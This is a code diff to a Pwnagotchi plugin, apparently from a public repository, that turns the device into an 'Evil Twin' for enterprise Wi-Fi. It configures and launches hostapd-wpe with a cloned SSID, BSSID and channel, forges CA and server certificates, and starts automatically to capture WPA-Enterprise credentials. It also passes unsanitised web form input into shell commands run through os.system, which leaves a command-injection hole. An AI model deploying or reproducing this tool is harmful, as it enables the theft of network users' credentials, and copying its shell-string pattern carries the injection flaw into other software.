@@ -3,6 +3,7 @@
 import os
 import logging
 import json
+import re
 from pwnagotchi import plugins
 from pwnagotchi import reboot
 from flask import abort
@@ -105,6 +106,56 @@ def add_task(options):
     systemctl("enable", task_service_name)
     reboot()
 
+def update_hostapd_config(interface, config, password):
+    confFilepath = "/etc/hostapd-wpe/hostapd-wpe.conf"
+
+    # Update hostapd-wpe configuration
+    os.system("sed -i 's/^\(private_key_passwd=\).*$/\1{1}/' {0}".format(confFilepath, password))
+    os.system("sed -i 's/^\(wpa_key_mgmt=\).*$/\1{1}/' {0}".format(confFilepath, "WPA-EAP"))
+    os.system("sed -i 's/^\(interface=\).*$/\1{1}/' {0}".format(confFilepath, interface))
+    os.system("sed -i 's/^\(ssid=\).*$/\1{1}/' {0}".format(confFilepath, config["ssid"]))
+    os.system("sed -i 's/^\(channel=\).*$/\1{1}/' {0}".format(confFilepath, config["channel"]))
+    os.system("sed -i 's/^\(wpa_pairwise=\).*$/\1{1}/' {0}".format(confFilepath, config["cipher"]))
+    os.system("sed -i 's/^\(rsn_pairwise=\).*$/\1{1}/' {0}".format(confFilepath, config["cipher"]))
+    mode = "a"
+    if int(config["channel"]) <= 14:
+        mode = "g"
+    os.system("sed -i 's/^\(hw_mode=\).*$/\1{1}/' {0}".format(confFilepath, mode))
+    # Get last digit(s) from enc method
+    os.system("sed -i 's/^\(wpa=\).*$/\1{1}/' {0}".format(confFilepath, re.sub('.*?([0-9]*)$',r'\1', config["enc"])))
+    # May need to find commented out line also if first run
+    os.system("sed -i 's/^#*\(bssid=\).*$/\1{1}/' {0}".format(confFilepath, config["bssid"]))
+    # May need to find commented out line also if first run
+    os.system("sed -i 's/^#*\(country_code=\).*$/\1{1}/' {0}".format(confFilepath, config["certificate"]["country"]))
+
+def generate_certificates(config, password):
+    directory = "/etc/hostapd-wpe"
+    caFilepath = "{0}/certs/ca.cnf".format(directory)
+    serverFilepath = "{0}/certs/server.cnf".format(directory)
+
+    # Update CA Certificate
+    os.system("sed -i '/[req]/,/^[/ s/^\(input_password=\).*$/\1{1}/' {0}".format(caFilepath, password))
+    os.system("sed -i '/[req]/,/^[/ s/^\(output_password=\).*$/\1{1}/' {0}".format(caFilepath, password))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(countryName\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["country"]))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(stateOrProvinceName\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["state"]))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(localityName\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["city"]))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(organizationName\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["organization"]))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(emailAddress\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["email"]))
+    os.system("sed -i '/[certificate_authority]/,/^[/ s/^\(commonName\s*=\).*$/\1 {1}/' {0}".format(caFilepath, config["certificate"]["commonName"]))
+
+    # Update Server Certificate
+    os.system("sed -i '/[req]/,/^[/ s/^\(input_password=\).*$/\1{1}/' {0}".format(serverFilepath, password))
+    os.system("sed -i '/[req]/,/^[/ s/^\(output_password=\).*$/\1{1}/' {0}".format(serverFilepath, password))
+    os.system("sed -i '/[server]/,/^[/ s/^\(countryName\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["country"]))
+    os.system("sed -i '/[server]/,/^[/ s/^\(stateOrProvinceName\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["state"]))
+    os.system("sed -i '/[server]/,/^[/ s/^\(localityName\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["city"]))
+    os.system("sed -i '/[server]/,/^[/ s/^\(organizationName\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["organization"]))
+    os.system("sed -i '/[server]/,/^[/ s/^\(emailAddress\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["email"]))
+    os.system("sed -i '/[server]/,/^[/ s/^\(commonName\s*=\).*$/\1 {1}/' {0}".format(serverFilepath, config["certificate"]["commonName"]))
+
+    # Generate certificates
+    os.system("$(cd {0}/certs && make ca && make server)".format(directory))
+
 # def serializer(obj):
 #     if isinstance(obj, set):
 #         return list(obj)
@@ -112,7 +163,7 @@ def add_task(options):
 
 class Enterprise(plugins.Plugin):
     __author__ = '5461464+BradlySharpe@users.noreply.github.com'
-    __version__ = '0.0.1'
+    __version__ = '0.0.2'
     __name__ = 'enterprise'
     __license__ = 'GPL3'
     __description__ = 'This plugin will attempt to obtain credentials from enterprise networks when bored and networks are available.'
@@ -122,16 +173,24 @@ class Enterprise(plugins.Plugin):
             "ssid": "",
             "bssid": "",
             "channel": 0,
-            "duration": 2, # minutes
+            "enc": "",
+            "cipher": "",
+            "certificate": {
+                "country": "",
+                "state": "",
+                "city": "",
+                "organisation": "",
+                "email": "",
+                "commonName": ""
+            },
             "enabled": False,
-            "access_points": []
+            "access_points": [],
         }
         self.rebooting = False
         self.ready = False
     
     def on_ready(self, agent):
         self.ready = True
-        logging.info("[enterprise] unit is ready")
 
     # called when the agent refreshed an unfiltered access point list
     # this list contains all access points that were detected BEFORE filtering
@@ -143,22 +202,35 @@ class Enterprise(plugins.Plugin):
                 if (ap["encryption"] != "OPEN") and (ap["authentication"] != "PSK"):
                     self.config["access_points"].append(ap)
 
-    def trigger(self):
+    def trigger(self, agent):
         if not self.ready:
             return
 
-        if self.config["enabled"]:
-            self.rebooting = True
-            
-            add_task(self.config)
+        if not self.config["enabled"]:
+            return
+
+        interface = self.options["interface"]
+        privateKeyPassword="whatever" # default password in configuration
+
+        self.rebooting = True 
+
+        update_hostapd_config(interface, self.config, privateKeyPassword)
+        generate_certificates(self.config, privateKeyPassword)
+
+        add_task({
+            "timeout": self.options["duration"],
+            "commands": [
+                "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"
+            ]
+        })
         
     # called when the status is set to bored
     def on_bored(self, agent):
-       self.trigger()
+       self.trigger(agent)
 
     # called when the status is set to sad
     def on_sad(self, agent):
-       self.trigger()
+       self.trigger(agent)
 
     def on_loaded(self):
         logging.info("[enterprise] is loaded.")
@@ -167,7 +239,6 @@ class Enterprise(plugins.Plugin):
         if self.rebooting:
             ui.set('line1', "Off to capture WPA-E Creds")
             ui.set('line2', "SSID: %s" % self.config["ssid"])
-
 
     def on_webhook(self, path, request):
         """
@@ -190,8 +261,24 @@ class Enterprise(plugins.Plugin):
         elif request.method == "POST":
             if path == "update-task":
                 try:
-                    logging.info("[enterprise] config received: {0}".format(json.dumps(request.get_json())))
-                    # Update configuration here
+                    data = request.get_json()
+
+                    self.config["bssid"] = data["bssid"]
+                    self.config["ssid"] = data["ssid"]
+                    self.config["channel"] = data["channel"]
+                    self.config["enc"] = data["enc"]
+                    self.config["cipher"] = data["cipher"]
+
+                    cert = data["certificate"]
+                    self.config["certificate"]["country"] = cert["country"]
+                    self.config["certificate"]["state"] = cert["state"]
+                    self.config["certificate"]["city"] = cert["city"]
+                    self.config["certificate"]["organisation"] = cert["organisation"]
+                    self.config["certificate"]["email"] = cert["email"]
+                    self.config["certificate"]["commonName"] = cert["commonName"]
+
+                    self.config["enabled"] = True
+
                     return "success"
                 except Exception as ex:
                     logging.error(ex)
@@ -203,11 +290,6 @@ INDEX = """
 {% set active_page = "enterprise" %}
 {% block title %}
     {{ title }}
-{% endblock %}
-
-{% block meta %}
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, user-scalable=0" />
 {% endblock %}
 
 {% block styles %}
@@ -281,23 +363,42 @@ INDEX = """
 {% endblock %}
 
 {% block content %}
-    <label for="bssid">BSSID:</label>
-    <input type="text" id="bssid" name="bssid" value="" placeholder="00:11:22:33:44:55" />
-    <label for="ssid">SSID:</label>
-    <input type="text" id="ssid" name="ssid" value="" placeholder="SSID Name" />
-    <label for="channel">Channel:</label>
-    <input type="number" id="channel" name="channel" value="" />
-    <label for="enc">Encryption:</label>
-    <input type="text" id="enc" name="enc" value="" placeholder="WPA2" />
-    <fieldset data-role="controlgroup">
-        <legend>Cipher:</legend>
-        <input type="radio" name="ccmp" id="ccmp" value="CCMP">
-        <label for="ccmp">CCMP</label>
-        <input type="radio" name="tkip" id="tkip" value="TKIP">
-        <label for="tkip">TKIP</label>
-        <input type="radio" name="both" id="both" value="TKIP CCMP">
-        <label for="both">TKIP + CCMP</label>
-    </fieldset>
+    <div data-role="collapsible" data-collapsed-icon="carat-d" data-expanded-icon="carat-u">
+        <h4>Evil Twin</h4>
+        <label for="bssid">BSSID:</label>
+        <input type="text" id="bssid" name="bssid" value="" placeholder="00:11:22:33:44:55" />
+        <label for="ssid">SSID:</label>
+        <input type="text" id="ssid" name="ssid" value="" placeholder="SSID Name" />
+        <label for="channel">Channel:</label>
+        <input type="number" id="channel" name="channel" value="" />
+        <label for="enc">Encryption:</label>
+        <input type="text" id="enc" name="enc" value="" placeholder="WPA2" />
+        <fieldset data-role="controlgroup">
+            <legend>Cipher:</legend>
+            <input type="radio" name="cipher" id="ccmp" value="CCMP">
+            <label for="ccmp">CCMP</label>
+            <input type="radio" name="cipher" id="tkip" value="TKIP">
+            <label for="tkip">TKIP</label>
+            <input type="radio" name="cipher" id="both" value="TKIP CCMP">
+            <label for="both">TKIP + CCMP</label>
+        </fieldset>
+    </div>
+    
+    <div data-role="collapsible" data-collapsed-icon="carat-d" data-expanded-icon="carat-u">
+        <h4>Certificate</h4>
+        <label for="country">Country:</label>
+        <input type="text" id="country" name="country" value="AU" placeholder="AU" />
+        <label for="state">State:</label>
+        <input type="text" id="state" name="state" value="Victoria" placeholder="Victoria" />
+        <label for="city">City:</label>
+        <input type="text" id="city" name="city" value="Melbourne" placeholder="Melbourne" />
+        <label for="organisation">Organisation:</label>
+        <input type="text" id="organisation" name="organisation" value="" placeholder="Organisation" />
+        <label for="email">Email:</label>
+        <input type="text" id="email" name="email" value="" placeholder="Email" />
+        <label for="commonName">Common Name:</label>
+        <input type="text" id="commonName" name="commonName" value="" placeholder="Common Name" />
+    </div>
     <button id="btnUpdate" type="button" onclick="updateTask()">Update Task</button>
     <hr />
     <div id="content">
@@ -310,6 +411,7 @@ INDEX = """
                 <th>Enc</th>
                 <th>Cipher</th>
                 <th>Auth</th>
+                <th>Clients</th>
             </tr>
             {% for ap in access_points %}
                 <tr>
@@ -332,11 +434,11 @@ INDEX = """
                     <td>{{ ap.encryption }}</td>
                     <td>{{ ap.cipher }}</td>
                     <td>{{ ap.authentication }}</td>
+                    <td>{{ ap.clients | length }}</td>
                 </tr>
             {% endfor %}
         </table>
     </div>
-    <!--<div id="debug"></div>-->
 {% endblock %}
 
 {% block script %}
@@ -363,8 +465,31 @@ INDEX = """
         }
 
         function updateTask(){
-            var json = {};
-            sendJSON("enterprise/update-task", json, function(response) {
+            var config = {
+                bssid: document.getElementById("bssid").value,
+                ssid: document.getElementById("ssid").value,
+                channel: document.getElementById("channel").value,
+                enc: document.getElementById("enc").value,
+                cipher: null,
+                certificate: {
+                    country: document.getElementById("country").value,
+                    state: document.getElementById("state").value,
+                    city: document.getElementById("city").value,
+                    organisation: document.getElementById("organisation").value,
+                    email: document.getElementById("email").value,
+                    commonName: document.getElementById("commonName").value,
+                }
+            };
+
+            if (document.getElementById("ccmp").checked)
+                config.cipher = document.getElementById("ccmp").value
+            else if (document.getElementById("tkip").checked)
+                config.cipher = document.getElementById("tkip").value
+            else if (document.getElementById("both").checked)
+                config.cipher = document.getElementById("both").value
+
+            
+            sendJSON("enterprise/update-task", config, function(response) {
                 if (response) {
                     if (response.status == "200") {
                         alert("Task updated");
@@ -389,25 +514,5 @@ INDEX = """
           xobj.send(JSON.stringify(data));
         }
 
-        /*
-        function loadJSON(url, callback) {
-          var xobj = new XMLHttpRequest();
-          xobj.overrideMimeType("application/json");
-          xobj.open('GET', url, true);
-          xobj.onreadystatechange = function () {
-                if (xobj.readyState == 4 && xobj.status == "200") {
-                  callback(JSON.parse(xobj.responseText));
-                }
-          };
-          xobj.send(null);
-        }
-
-        loadJSON("enterprise/get-config", function(response) {
-            var divDebug = document.getElementById("debug");
-            divDebug.innerHTML = "";
-            divDebug.innerHTML = JSON.stringify(response);
-            //divDebug.appendChild(table);
-        });
-        */
 {% endblock %}
 """
